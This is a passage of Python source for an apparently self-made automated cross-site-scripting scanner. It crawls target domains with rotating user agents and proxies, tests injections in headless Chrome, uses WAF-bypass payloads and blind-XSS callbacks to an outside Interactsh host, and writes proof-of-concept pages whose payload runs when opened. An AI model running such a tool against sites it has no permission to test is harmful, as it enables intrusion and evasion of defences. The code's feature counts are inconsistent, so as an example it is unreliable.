        os.makedirs(log_dir)
    current_time = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    sanitized_domain = re.sub(r'\W+', '_', domain)
    log_filename = os.path.join(log_dir, f'{sanitized_domain}_{current_time}.log')
    logging.basicConfig(level=logging.INFO,
                        format='%(asctime)s - %(levelname)s - %(message)s',
                        handlers=[
                            logging.FileHandler(log_filename),
                            logging.StreamHandler()
                        ])
    return log_filename

# Initial console info
current_time_log = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
print(f"{GREEN}[INFO]{END} Starting XSS scanner at {current_time_log}.")

# User agents
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0",
]

def get_random_headers():
    return {'User-Agent': random.choice(USER_AGENTS)}

# Database setup
def setup_database():
    connection = sqlite3.connect('xss_scan_results.db', check_same_thread=False)
    cursor = connection.cursor()
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS vulnerabilities (
            id INTEGER PRIMARY KEY,
            url TEXT NOT NULL,
            payload TEXT NOT NULL,
            discovered_at DATETIME NOT NULL,
            method TEXT NOT NULL,
            xss_type TEXT NOT NULL,
            success INTEGER NOT NULL,
            poc_file TEXT
        )
    """)
    # Updated training_data table to include new features for DL/RL (now 23 features total)
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS training_data (
            id INTEGER PRIMARY KEY,
            url TEXT,
            param TEXT,
            payload TEXT,
            server_type TEXT,
            method TEXT,
            response_code INTEGER,
            response_time REAL,
            response_pattern TEXT,
            success INTEGER,
            content_snippet TEXT,
            vulnerable INTEGER,
            injection_context TEXT,
            nlp_forms_found INTEGER,
            nlp_inputs_count INTEGER,
            nlp_scripts_found INTEGER,
            nlp_has_eval_or_write INTEGER,
            nlp_has_sanitization_patterns INTEGER,
            nlp_reflected_location_type TEXT,
            fuzz_num_filtered INTEGER,
            fuzz_num_encoded INTEGER,
            payload_len INTEGER,
            reflected_len_ratio REAL,
            payload_nesting_level INTEGER,
            waf_detected TEXT,
            num_encoded_chars INTEGER,
            dom_element_created INTEGER,
            csp_present INTEGER,
            csp_strength TEXT,
            dom_nodes_added INTEGER,
            attr_modifications INTEGER,
            browser_console_errors_count INTEGER, -- NEW FEATURE
            payload_in_console_logs INTEGER     -- NEW FEATURE
        )
    """)
    connection.commit()
    return connection

db_connection = setup_database()

# Ensure necessary files are created
def create_files():
    if not os.path.exists('training_data.csv'):
        with open('training_data.csv', 'w', newline='', encoding='utf-8') as f:
            writer = csv.writer(f)
            writer.writerow([
                'url', 'param', 'payload', 'server_type', 'method', 'response_code', 'response_time',
                'response_pattern', 'success', 'content_snippet', 'vulnerable', 'injection_context',
                'nlp_forms_found', 'nlp_inputs_count', 'nlp_scripts_found', 'nlp_has_eval_or_write',
                'nlp_has_sanitization_patterns', 'nlp_reflected_location_type',
                'fuzz_num_filtered', 'fuzz_num_encoded', 'payload_len', 'reflected_len_ratio', 
                'payload_nesting_level', 'waf_detected', 'num_encoded_chars', 'dom_element_created',
                'csp_present', 'csp_strength', 'dom_nodes_added', 'attr_modifications',
                'browser_console_errors_count', 'payload_in_console_logs' # NEW FEATURES
            ])
    
    open('total_links_audited.txt', 'w').close()
    open('found_links.txt', 'w').close()
    open('audit_links.txt', 'w').close()

    if not os.path.exists('pocs'):
        os.makedirs('pocs')

create_files()

# Cursor animation for loading
stop_animation = False

def animate_cursor():
    cursor_chars = ['|', '/', '-', '\\']
    i = 0
    while not stop_animation:
        print(f"Loading {cursor_chars[i % len(cursor_chars)]}", end='\r')
        time.sleep(0.1)
        i += 1
    print(" " * 20, end='\r')

cursor_thread = threading.Thread(target=animate_cursor)
cursor_thread.daemon = True
cursor_thread.start()

# Queue for database operations
db_queue = queue.Queue()

# Function to handle database operations
def db_worker():
    while True:
        item = db_queue.get()
        if item == "terminate":
            break
        db_connection, query, params = item
        try:
            cursor = db_connection.cursor()
            cursor.execute(query, params)
            db_connection.commit()
        except Exception as e:
            logging.error(f"{RED}[DB ERROR]{END} Database operation error: {e}")
        finally:
            db_queue.task_done()

db_thread = threading.Thread(target=db_worker)
db_thread.daemon = True
db_thread.start()

# --- Rate Limiter Class ---
class RateLimiter:
    def __init__(self, requests_per_minute):
        self.requests_per_minute = requests_per_minute
        self.seconds_per_request = 60.0 / requests_per_minute if requests_per_minute > 0 else 0
        self.last_request_time = time.time() if requests_per_minute > 0 else 0
        logging.info(f"{Fore.MAGENTA}[RateLimiter] Initialized for {self.requests_per_minute} RPM ({self.seconds_per_request:.2f} s/req).{Style.RESET_ALL}")

    async def wait_for_next_request(self):
        if self.requests_per_minute <= 0:
            return # No rate limit applied

        current_time = time.time()
        elapsed_time = current_time - self.last_request_time
        
        if elapsed_time < self.seconds_per_request:
            sleep_time = self.seconds_per_request - elapsed_time
            # logging.debug(f"[RateLimiter] Sleeping for {sleep_time:.2f} seconds...")
            await asyncio.sleep(sleep_time)
        self.last_request_time = time.time()

# --- URL Discovery Functions ---
async def fetch_urls_commoncrawl(domain, session, rate_limiter):
    normalized_domain = normalize_domain(domain)
    logging.info(f"{GREEN}[INFO]{END} Fetching URLs from CommonCrawl for domain: {normalized_domain}")
    cc_api = f"http://index.commoncrawl.org/CC-MAIN-2024-10-index?url=*.{normalized_domain}/*&output=json"
    try:
        await rate_limiter.wait_for_next_request() # Apply rate limit
        async with session.get(cc_api, timeout=30) as response:
            if response.status == 200:
                text = await response.text()
                urls = [json.loads(line)['url'] for line in text.splitlines() if line.strip()]
                logging.info(f"{GREEN}[INFO]{END} {len(urls)} URLs fetched from CommonCrawl.")
                return urls
            else:
                logging.error(f"{RED}[ERROR]{END} Failed to fetch CommonCrawl URLs. Status: {response.status}")
                return []
    except Exception as e:
        logging.error(f"{RED}[ERROR]{END} Error fetching CommonCrawl URLs: {e}")
        return []

async def fetch_urls_wayback(domain, session, rate_limiter):
    normalized_domain = normalize_domain(domain)
    logging.info(f"{GREEN}[INFO]{END} Fetching URLs from Wayback Machine for domain: {normalized_domain}")
    wayback_api = f"http://web.archive.org/cdx/search/cdx?url=*.{normalized_domain}/*&output=json&fl=original&collapse=urlkey"
    try:
        await rate_limiter.wait_for_next_request() # Apply rate limit
        async with session.get(wayback_api, timeout=30) as response:
            if response.status == 200:
                results = await response.json()
                urls = [result[0] for result in results[1:]]
                logging.info(f"{GREEN}[INFO]{END} {len(urls)} URLs fetched from Wayback Machine.")
                return urls
            else:
                logging.error(f"{RED}[ERROR]{END} Failed to fetch Wayback Machine URLs. Status: {response.status}")
                return []
    except Exception as e:
        logging.error(f"{RED}[ERROR]{END} Error fetching Wayback Machine URLs: {e}")
        return []

async def crawl_website(domain, session, max_depth, rate_limiter):
    normalized_domain = normalize_domain(domain)
    logging.info(f"{GREEN}[INFO]{END} Crawling website: {normalized_domain}")
    crawled_urls = set()
    urls_to_crawl = deque([(f"http://{normalized_domain}", 0)])
    
    crawled_urls.add(f"http://{normalized_domain}")
    if not f"https://{normalized_domain}" in crawled_urls:
        crawled_urls.add(f"https://{normalized_domain}")

    while urls_to_crawl:
        url, depth = urls_to_crawl.popleft()
        if depth > max_depth:
            continue

        logging.info(f"Crawling [Depth:{depth}]: {url}")
        
        try:
            await rate_limiter.wait_for_next_request() # Apply rate limit
            async with session.get(url, timeout=10, ssl=False, headers={'User-Agent': random.choice(USER_AGENTS)}) as response:
                if response.status == 200 and 'text/html' in response.headers.get('Content-Type', ''):
                    html = await response.text()
                    soup = BeautifulSoup(html, 'html.parser')
                    for link_tag in soup.find_all('a', href=True):
                        href = link_tag['href']
                        full_url = urljoin(url, href)
                        parsed_full_url = urlparse(full_url)
                        if parsed_full_url.netloc.endswith(normalized_domain) and full_url not in crawled_urls:
                            crawled_urls.add(full_url)
                            urls_to_crawl.append((full_url, depth + 1))
                else:
                    logging.warning(f"{YELLOW}[WARN]{END} Skipped {url} (Status: {response.status} or non-HTML).")
        except Exception as e:
            logging.error(f"{RED}[ERROR]{END} Failed to crawl {url}: {str(e)}")

    logging.info(f"{GREEN}[INFO]{END} {len(crawled_urls)} URLs crawled from {normalized_domain}.")
    return list(crawled_urls)

def sanitize_filename(domain):
    sanitized = re.sub(r'http[s]?://', '', domain)
    sanitized = re.sub(r'\W+', '_', sanitized)
    return sanitized

def extract_base_url_and_params(url):
    parsed_url = urlparse(url)
    base_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}"
    query_params = parse_qs(parsed_url.query)
    normalized_params = {k: v[0] for k, v in query_params.items()}
    return base_url, normalized_params

async def fetch_and_clean_urls(domain, session, stream_output=False, rate_limiter=None):
    logging.info(f"{YELLOW}[INFO]{END} Fetching and cleaning URLs for {domain}")
    wayback_uri = f"https://web.archive.org/cdx/search/cdx?url={domain}/*&output=txt&collapse=urlkey&fl=original&page=/"
    
    urls = []
    try:
        if rate_limiter: await rate_limiter.wait_for_next_request() # Apply rate limit
        async with session.get(wayback_uri, timeout=30) as response:
            if response.status == 200:
                urls = (await response.text()).split()
            else:
                logging.error(f"{RED}[ERROR]{END} Failed to fetch URLs from Wayback Machine. Status: {response.status}")
                return []
    except Exception as e:
        logging.error(f"{RED}[ERROR]{END} Error fetching URLs from Wayback Machine: {e}")
        return []

    logging.info(f"{GREEN}[INFO]{END} {len(urls)} URLs found for {domain}")

    seen = set()
    cleaned_urls = []
    for url in urls:
        base_url, query_params = extract_base_url_and_params(url)
        unique_key = (base_url, tuple(sorted(query_params.keys())))
        if unique_key not in seen:
            seen.add(unique_key)
            cleaned_urls.append(url)
            if stream_output:
                print(url)
    
    logging.info(f"{GREEN}[INFO]{END} {len(cleaned_urls)} URLs found after cleaning.{Style.RESET_ALL}")
    sanitized_domain = sanitize_filename(domain)
    result_file = f"{sanitized_domain}_cleaned_urls.txt"
    
    await asyncio.to_thread(lambda: open(result_file, "w").write("\n".join(cleaned_urls)))
    
    logging.info(f"{GREEN}[INFO]{END} Cleaned URLs saved to {result_file}{Style.RESET_ALL}")
    return cleaned_urls

# --- Data Persistence Functions ---
def save_training_data_to_csv(data):
    asyncio.create_task(asyncio.to_thread(_save_training_data_to_csv, data))

def _save_training_data_to_csv(data):
    with open('training_data.csv', mode='a', newline='', encoding='utf-8') as file:
        writer = csv.writer(file)
        writer.writerow(data)

# UPDATED: insert_training_data now takes 33 arguments to match the DB schema and extract_features
def insert_training_data(url, param, payload, server_type, method, response_code, response_time, response_pattern, success, content_snippet, vulnerable, injection_context, nlp_forms_found, nlp_inputs_count, nlp_scripts_found, nlp_has_eval_or_write, nlp_has_sanitization_patterns, nlp_reflected_location_type, fuzz_num_filtered, fuzz_num_encoded, payload_len, reflected_len_ratio, payload_nesting_level, waf_detected, num_encoded_chars, dom_element_created, csp_present, csp_strength, dom_nodes_added, attr_modifications, browser_console_errors_count, payload_in_console_logs):
    query = """
        INSERT INTO training_data (url, param, payload, server_type, method, response_code, response_time, response_pattern, success, content_snippet, vulnerable, injection_context, nlp_forms_found, nlp_inputs_count, nlp_scripts_found, nlp_has_eval_or_write, nlp_has_sanitization_patterns, nlp_reflected_location_type, fuzz_num_filtered, fuzz_num_encoded, payload_len, reflected_len_ratio, payload_nesting_level, waf_detected, num_encoded_chars, dom_element_created, csp_present, csp_strength, dom_nodes_added, attr_modifications, browser_console_errors_count, payload_in_console_logs)
        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
    """
    db_queue.put((db_connection, query, (url, param, payload, server_type, method, response_code, response_time, response_pattern, success, content_snippet, vulnerable, injection_context, nlp_forms_found, nlp_inputs_count, nlp_scripts_found, nlp_has_eval_or_write, nlp_has_sanitization_patterns, nlp_reflected_location_type, fuzz_num_filtered, fuzz_num_encoded, payload_len, reflected_len_ratio, payload_nesting_level, waf_detected, num_encoded_chars, dom_element_created, csp_present, csp_strength, dom_nodes_added, attr_modifications, browser_console_errors_count, payload_in_console_logs)))
    save_training_data_to_csv([url, param, payload, server_type, method, response_code, response_time, response_pattern, success, content_snippet, vulnerable, injection_context, nlp_forms_found, nlp_inputs_count, nlp_scripts_found, nlp_has_eval_or_write, nlp_has_sanitization_patterns, nlp_reflected_location_type, fuzz_num_filtered, fuzz_num_encoded, payload_len, reflected_len_ratio, payload_nesting_level, waf_detected, num_encoded_chars, dom_element_created, csp_present, csp_strength, dom_nodes_added, attr_modifications, browser_console_errors_count, payload_in_console_logs])

def insert_vulnerability_data(url, payload, method, xss_type, success, poc_file=None):
    query = """
        INSERT INTO vulnerabilities (url, payload, discovered_at, method, xss_type, success, poc_file)
        VALUES (?, ?, ?, ?, ?, ?, ?)
    """
    db_queue.put((db_connection, query, (url, payload, datetime.now(), method, xss_type, 1, poc_file)))

# --- PoC Generation Functions ---
def generate_xss_poc(url, payload, method, xss_type):
    """Generates an HTML Proof of Concept (PoC) file for an XSS vulnerability."""
    poc_dir = 'pocs'
    if not os.path.exists(poc_dir):
        os.makedirs(poc_dir)

    parsed_url = urlparse(url)
    clean_path = re.sub(r'[^a-zA-Z0-9_\-]', '', parsed_url.netloc + parsed_url.path.replace('/', '_'))
    poc_filename = os.path.join(poc_dir, f"poc_{clean_path}_{datetime.now().strftime('%H%M%S')}.html")

    html_content = f"""
    <!DOCTYPE html>
    <html>
    <head>
        <title>XSS Proof of Concept - {xss_type}</title>
        <style>
            body {{ font-family: Arial, sans-serif; background-color: #f0f2f5; color: #333; margin: 20px; }}
            .container {{ background-color: #fff; padding: 25px; border-radius: 8px; box-shadow: 0 4px 8px rgba(0,0,0,0.1); max-width: 800px; margin: 20px auto; }}
            h1 {{ color: #d63384; }}
            h2 {{ color: #007bff; }}
            pre {{ background-color: #e9ecef; padding: 15px; border-radius: 5px; overflow-x: auto; }}
            code {{ color: #c42f2f; }}
            .info {{ background-color: #e6f7ff; border-left: 5px solid #2196f3; padding: 10px; margin-bottom: 20px; }}
        </style>
    </head>
    <body>
        <div class="container">
            <h1>XSS Vulnerability Proof of Concept</h1>
            <div class="info">
                <p>This file demonstrates a detected Cross-Site Scripting (XSS) vulnerability.</p>
                <p><strong>Note:</strong> The payload will execute automatically when this file is opened in a browser.</p>
            </div>

            <h2>Vulnerability Details</h2>
            <p><strong>Vulnerable URL:</strong> <a href="{url}" target="_blank">{url}</a></p>
            <p><strong>HTTP Method:</strong> {method}</p>
            <p><strong>Detected XSS Type:</strong> {xss_type}</p>
            <p><strong>Injected Payload:</strong></p>
            <pre><code>{payload.replace('<', '&lt;').replace('>', '&gt;')}</code></pre>

            <h2>Attack Reconstruction</h2>
            <p>Open this page to see the payload in action. This is a direct simulation of the injection.</p>
            <p>To reproduce:</p>
            <ul>
                <li>Navigate to the vulnerable URL.</li>
                <li>If the method is GET, the payload is directly in the URL.</li>
                <li>If the method is POST, the payload was submitted via a form.</li>
            </ul>

            <h2>Active Payload (for demonstration)</h2>
            <p>The following code simulates the injection of the payload into the page. If the target environment is vulnerable, execution will occur.</p>
            <pre><code>
    <!-- The injected payload will be executed here. The exact content depends on the injection context. -->
    <!-- For a Reflected/DOM XSS, the browser will execute this code. -->
    <!-- For a Blind XSS, an interaction with the Interactsh callback server would have occurred. -->

    {payload}

    <script>
        // This is a PoC script. The XSS payload above is the actual injection point.
        // This part just ensures the payload is displayed and potentially executed
        // in the context of this PoC file.
        console.log("PoC loaded. Check the console or network tab for signs of XSS payload execution.");
        try {{
            // Look for the specific marker injected by DOM XSS payloads
            const domMarker = document.getElementById('xss_dom_marker');
            if (domMarker) {{
                console.log("DOM XSS Marker detected! JavaScript payload successfully modified the DOM.");
            }}
            // You can add more complex checks here if needed for specific payloads
        }} catch (e) {{
            console.error("Error in PoC script during DOM check:", e);
        }}
    </script>
            </code></pre>
        </div>
    </body>
    </html>
    """
    
    try:
        with open(poc_filename, 'w', encoding='utf-8') as f:
            f.write(html_content)
        logging.info(f"{GREEN}[INFO]{END} PoC generated: {poc_filename}{Style.RESET_ALL}")
        return poc_filename
    except Exception as e:
        logging.error(f"{Fore.RED}[ERROR]{END} Error generating PoC for {url}: {e}{Style.RESET_ALL}")
        return None

def check_dom_for_xss_execution(driver, payload):
    """
    Checks the page's DOM for signs of XSS payload execution beyond simple reflection.
    Specifically looks for a 'xss_dom_marker' element created by a payload.
    """
    try:
        # Check for the specific element ID that our advanced DOM XSS payload would create
        marker_element = driver.find_elements(By.ID, 'xss_dom_marker')
        if marker_element:
            logging.info(f"{Fore.GREEN}[DOM ANALYSIS]{END} Found 'xss_dom_marker' element in DOM. DOM XSS payload executed!{Style.RESET_ALL}")
            return True
        
        # General check: if the payload itself is found, it's reflected, but we want execution proof
        if payload in driver.page_source:
            # We already track simple reflection, this is for execution effects
            pass

    except WebDriverException as e:
        logging.warning(f"{YELLOW}[DOM ANALYSIS]{END} Error during advanced DOM check: {e}{Style.RESET_ALL}")
    return False

# --- SCANNER CORE ---
class AsyncXSSScanner:
    def __init__(self, target_urls, max_depth, num_drivers, ai_api_key, proxy, report_file=None, use_model=False, enable_blind_xss=False, blind_xss_callback_url=None, requests_per_minute=30):
        self.url_list = list(set(target_urls))
        self.max_depth = max_depth
        self.num_drivers = num_drivers
        self.proxy = proxy
        self.report_file = report_file
        self.use_model = use_model
        
        # Determine the primary target domain for logging and model saving
        self.target_domain = normalize_domain(target_urls[0]) if target_urls else 'unknown.com'
        self.driver_pool = asyncio.Queue()
        
        self.enable_blind_xss = enable_blind_xss
        self.blind_xss_callback_url = blind_xss_callback_url

        # Set interact_host for Blind XSS payloads
        if self.enable_blind_xss and self.blind_xss_callback_url:
            parsed_callback = urlparse(self.blind_xss_callback_url)
            self.interact_host = parsed_callback.netloc + parsed_callback.path.rstrip('/') # Use netloc + path as base for callback
        else:
            # Generate a random subdomain for the default Interactsh if blind XSS is not enabled or no URL provided
            self.interact_host = f"{''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=12))}.{DEFAULT_INTERACTSH_DOMAIN}"
            logging.critical(f"{Fore.YELLOW}Les payloads Blind XSS utiliseront le domaine de rappel: {self.interact_host}{Style.RESET_ALL}")
            logging.critical(f"{Fore.GREEN}Surveillez http://{self.interact_host} pour les interactions.{Style.RESET_ALL}")

        self.payload_generator = WAFBypassPayloads(self.interact_host if self.enable_blind_xss else "n/a") # Pass "n/a" if blind XSS is off to prevent blind payloads

        self.visited_urls = set()
        self.vulnerable_urls = []
        self.scan_results = [] # This list will store results for model training

        self.model = DeepLearningModel() if use_model else None # UPDATED: DeepLearningModel will now default to input_dim=23
        self.rl_agent = ReinforcementLearningAgent()
        self.methods = ["GET", "POST"]

        self.reflected_location_type_mapping = {
            'none': 0, 'text': 1, 'attribute': 2, 'script_content': 3,
            'script_attribute': 4, 'comment': 5, 'url': 6
        }
        
        self.ai_api_key = ai_api_key

        # Rate Limiting
        self.rate_limiter = RateLimiter(requests_per_minute)

    def get_reward_for_payload(self, is_vulnerable, injection_context, payload_was_reflected, dom_element_created, browser_console_errors_count, payload_in_console_logs):
        """Calculates a more granular reward for the RL agent, incorporating new console features."""
        reward = 0.0
        if is_vulnerable:
            reward += 1.0 # Base reward for confirmed vulnerability
            if dom_element_created:
                reward += 0.5 # Extra for confirmed DOM XSS execution
        elif payload_was_reflected:
            if injection_context in ["script_content", "script_attribute", "attribute"]:
                reward += 0.3 # Small reward for reflection in promising contexts
            else:
                reward += 0.1 # Very small reward for general reflection
        
        if browser_console_errors_count > 0:
            reward -= 0.2 # Penalty for JS errors (might indicate broken payload)
            if payload_in_console_logs:
                reward += 0.1 # Slight recovery if payload is in logs (feedback, even if error)
        
        # Ensure minimum negative reward
        return max(reward, -0.5) if not is_vulnerable else reward


    async def initialize_drivers(self):
        if not SELENIUM_AVAILABLE: 
            logging.error(f"{Fore.RED}Selenium is not available. Cannot initialize browsers. Scan will be limited.{Style.RESET_ALL}")
            return
        
        for i in range(self.num_drivers):
            try:
                options = Options()
                options.add_argument("--headless")
                options.add_argument("--no-sandbox")
                options.add_argument("--disable-dev-shm-usage")
                options.add_argument("--disable-gpu")
                options.add_argument("--window-size=1920,1080")
                user_agent = random.choice(USER_AGENTS)
                options.add_argument(f"user-agent={user_agent}")
                
                # Proxy authentication for Selenium
                if self.proxy and "@" in self.proxy and ":" in self.proxy.split('@')[0]:
                    try:
                        # proxy_auth = base64.b64encode(self.proxy.split('//')[1].split('@')[0].encode()).decode()
                        # options.add_argument(f'--proxy-server={self.proxy.split("@")[1]}')
                        # This requires an extension or a specific way to handle auth, simpler for now to use a generic proxy URL
                        # For simplicity, we are passing basic HTTP proxy here.
                        # For HTTPS proxy with auth, usually need browser extensions or custom profile.
                        logging.warning(f"{YELLOW}[Selenium Proxy] Authenticated proxy setup for Selenium is complex and not fully automated here. Using simple proxy if provided.{Style.RESET_ALL}")
                        options.add_argument(f'--proxy-server={self.proxy.split("@")[-1]}') # Just pass host:port part
                    except Exception as e:
                        logging.error(f"{Fore.RED}[Selenium Proxy] Error parsing authenticated proxy: {e}. Attempting without auth.{Style.RESET_ALL}")
                        options.add_argument(f'--proxy-server={self.proxy}')
                elif self.proxy:
                    options.add_argument(f'--proxy-server={self.proxy}')
                
                # New: Attempt to set logging preferences for console logs
                options.set_capability('goog:loggingPrefs', {'browser': 'ALL'})

                driver = await asyncio.to_thread(lambda: webdriver.Chrome(service=ChromeService(), options=options))
                await self.driver_pool.put(driver)
                logging.info(f"WebDriver {i+1} initialized successfully.{Style.RESET_ALL}")
            except WebDriverException as e:
                logging.error(f"{Fore.RED}Failed to create WebDriver instance ({i+1}): {e}{Style.RESET_ALL}")
        logging.info(f"{self.driver_pool.qsize()} drivers ready in the pool.{Style.RESET_ALL}")

    async def load_or_train_model(self):
        if not self.use_model: return
        model_path = f"{normalize_domain(self.target_domain)}_xss_model.pkl"
        
        if os.path.exists(model_path):
            try:
                with open(model_path, 'rb') as model_file:
                    self.model = await asyncio.to_thread(pickle.load, model_file)
                if hasattr(self.model, "predict") and callable(getattr(self.model, "predict")):
                    logging.info(f"{GREEN}[INFO]{END} Existing model loaded from {model_path}{Style.RESET_ALL}")
                    if not self.model.is_trained:
                        logging.warning(f"{YELLOW}[WARN]{END} Loaded model is not marked as trained. Will attempt retraining if data becomes available.{Style.RESET_ALL}")
                else:
                    logging.error(f"{Fore.RED}[ERROR]{END} Existing model at {model_path} is invalid. Will train a new model if data becomes available.{Style.RESET_ALL}")
                    self.model = DeepLearningModel()
            except Exception as e:
                logging.error(f"{Fore.RED}[ERROR]{END} Error loading model: {e}. Will train a new model if data becomes available.{Style.RESET_ALL}")
                self.model = DeepLearningModel()
        else:
            logging.info(f"{YELLOW}[INFO]{END} No trained model found for domain: {self.target_domain}. Will train a new model if data becomes available.{Style.RESET_ALL}")
            # self.model is already initialized by __init__ if use_model is True

    async def train_new_model(self):
        logging.info("Training a new model...")
        X, y = await self.generate_training_data()
        if not self.validate_training_data(X, y):
            return
        try:
            await asyncio.to_thread(self.model.train, X, y)
            await self.save_model()
        except Exception as e:
            logging.error(f"{Fore.RED}Error during model training: {e}{Style.RESET_ALL}")

    async def save_model(self):
        if not self.model: return
        model_path = f"{normalize_domain(self.target_domain)}_xss_model.pkl"
        try:
            await asyncio.to_thread(lambda: pickle.dump(self.model, open(model_path, 'wb')))
            logging.info(f"{GREEN}[INFO]{END} Model saved to {model_path}{Style.RESET_ALL}")
        except Exception as e:
            logging.error(f"{Fore.RED}Error saving model: {e}{Style.RESET_ALL}")

    async def generate_training_data(self):
        X = []
        y = []
        if not self.scan_results:
            logging.warning("No scan results available to generate training data.")
            return X, y
        for result in self.scan_results:
            # Ensure all 23 features are passed correctly
            features = self.extract_features(
                result.get('params', {}),
                result.get('injection_context', 'generic'),
                result.get('fuzz_results', {}),
                result.get('nlp_results', {}),
                result.get('payload', ''),
                result.get('response_text', ''),
                result.get('waf_detected', 'None'),
                result.get('dom_element_created', 0),
                result.get('csp_present', False),
                result.get('csp_strength', 'None'),
                result.get('nlp_results', {}).get('dom_nodes_added', 0),
                result.get('nlp_results', {}).get('attr_modifications', 0),
                result.get('nlp_results', {}).get('forms_found', False), # NEW
                result.get('nlp_results', {}).get('input_fields_count', 0), # NEW
                result.get('nlp_results', {}).get('scripts_found', False), # NEW
                result.get('nlp_results', {}).get('has_eval_or_write', False), # NEW
                result.get('nlp_results', {}).get('has_common_sanitization_patterns', False), # NEW
                result.get('nlp_results', {}).get('reflected_location_type', 'none'), # NEW
                result.get('browser_console_errors_count', 0), # NEW
                result.get('payload_in_console_logs', False) # NEW
            )
            X.append(features)
            y.append(int(result.get('vulnerable', 0)))
        return X, y


    def validate_training_data(self, X, y):
        if not X or not y:
            logging.error("Training data is empty. Cannot train model.")
            return False
        if X and len(set(len(f) for f in X)) > 1:
             logging.error("Feature vectors in training data have inconsistent lengths.")
             return False
        # UPDATED: Ensure DeepLearningModel's input_dim matches actual feature length
        if X and self.model and len(X[0]) != self.model.input_dim: # Changed to self.model.input_dim
            logging.error(f"Feature length ({len(X[0])}) does not match model input shape ({self.model.input_dim}). Adjust `extract_features` or `build_model`.")
            return False
        return True

    async def auto_filter(self, urls):
        if not self.model or not self.model.is_trained:
            logging.warning(f"{YELLOW}[WARN]{END} Model is not trained or does not exist. Skipping auto-filtering.{Style.RESET_ALL}")
            return urls # Return original URLs if model is not ready

        filtered_urls = []
        features_list = []
        original_urls_map = {}

        for url in urls:
            parsed_url = urlparse(url)
            query_params = parse_qs(parsed_url.query)
            # Dummy data for features not available during initial URL filtering
            dummy_fuzz_results = {} 
            dummy_nlp_results = {
                "forms_found": False, "input_fields_count": 0, "scripts_found": False,
                "has_eval_or_write": False, "has_common_sanitization_patterns": False,
                "reflected_location_type": "none", "payload_reflection_level": -1,
                "dom_nodes_added": 0, "attr_modifications": 0, "new_script_tags": 0, "new_iframe_tags": 0, "new_svg_tags": 0
            }
            # For auto-filtering, we don't have all post-injection NLP results or console logs.
            # Use sensible defaults for these.
            # UPDATED: Call extract_features with all 23 arguments for auto-filtering, with defaults
            features = self.extract_features(query_params, 'generic', dummy_fuzz_results, dummy_nlp_results, '', '', 'None', 0, False, 'None', 0, 0,
                                            False, 0, False, False, False, 'none', # NLP initial
                                            0, False) # Console logs initial
            features_list.append(features)
            original_urls_map[tuple(features)] = url 

        if not features_list: return []

        try:
            predictions = await asyncio.to_thread(self.model.predict, features_list)
            for i, pred in enumerate(predictions):
                if pred: # If model predicts it's potentially vulnerable
                    filtered_urls.append(original_urls_map[tuple(features_list[i])])
            logging.info(f"{GREEN}[INFO]{END} {len(filtered_urls)} URLs filtered by the model for scanning.{Style.RESET_ALL}")
            return filtered_urls
        except Exception as e:
            logging.error(f"{Fore.RED}Error during auto-filtering of URLs: {e}. Reverting to all URLs.{Style.RESET_ALL}")
            return urls

    def extract_features(self, query_params, injection_context, fuzz_results, nlp_results, payload, response_text, waf_detected, dom_element_created, csp_present, csp_strength, dom_nodes_added, attr_modifications, nlp_forms_found, nlp_inputs_count, nlp_scripts_found, nlp_has_eval_or_write, nlp_has_sanitization_patterns, nlp_reflected_location_type, browser_console_errors_count, payload_in_console_logs):
        """
        Extracts 23 features from scan results for the Deep Learning model.
        UPDATED: New features for console logs, adjusted NLP features for consistency.
        """
        features = []
        
        # 1. URL/Form Parameter Features (2)
        features.append(len(query_params))
        first_param_name_len = len(list(query_params.keys())[0]) if query_params else 0
        features.append(first_param_name_len)
        
        # 2. Injection Context & Payload Features (3)
        context_mapping = {'html':0, 'attribute':1, 'script_content':2, 'script_attribute':3, 'url':4, 'comment':5, 'generic':6}
        features.append(context_mapping.get(injection_context, 6))
        
        payload_len = len(payload)
        # Calculate reflected_len from response_text if payload is found
        reflected_len = 0
        if payload and payload in response_text:
            reflected_len = len(payload) # Assuming direct reflection for this feature
        
        reflected_len_ratio = reflected_len / payload_len if payload_len > 0 else 0
        features.append(payload_len)
        features.append(reflected_len_ratio)

        # 3. Character Fuzzer Results (2 - reduced from 3 by removing fuzz_success_rate)
        features.append(sum(1 for info in fuzz_results.values() if info['status'] == 'filtered'))
        features.append(sum(1 for info in fuzz_results.values() if info['status'] == 'encoded'))

        # 4. NLP Analysis Results (6 - now more detailed)
        features.append(1 if nlp_forms_found else 0)
        features.append(nlp_inputs_count) # Was missing, now included
        features.append(1 if nlp_scripts_found else 0) # Was missing, now included
        features.append(1 if nlp_has_eval_or_write else 0)
        features.append(1 if nlp_has_sanitization_patterns else 0)
        features.append(self.reflected_location_type_mapping.get(nlp_reflected_location_type, 0))

        # 5. New Features: WAF, Nesting Level, Encoded Chars, DOM Element Created (4)
        waf_mapping = {waf: i for i, waf in enumerate(['None', 'cloudflare', 'incapsula', 'sucuri', 'akamai', 'modsecurity', 'barracuda', 'fastly', 'azure_application_gateway', 'f5_big_ip', 'wordfence', 'imperva'])}
        features.append(waf_mapping.get(waf_detected, 0))
        features.append(nlp_results.get('payload_reflection_level', -1)) # Still from nlp_results dict
        
        # Calculate num_encoded_chars based on the actual payload, not just fuzzing results
        num_encoded_chars = sum(1 for char_code in map(ord, payload) if not (32 <= char_code <= 126)) # Count non-ASCII printable chars
        features.append(num_encoded_chars)

        features.append(1 if dom_element_created else 0)

        # 6. New Features for training (CSP, Rich DOM Feedback, Console Logs) (4)
        features.append(1 if csp_present else 0)
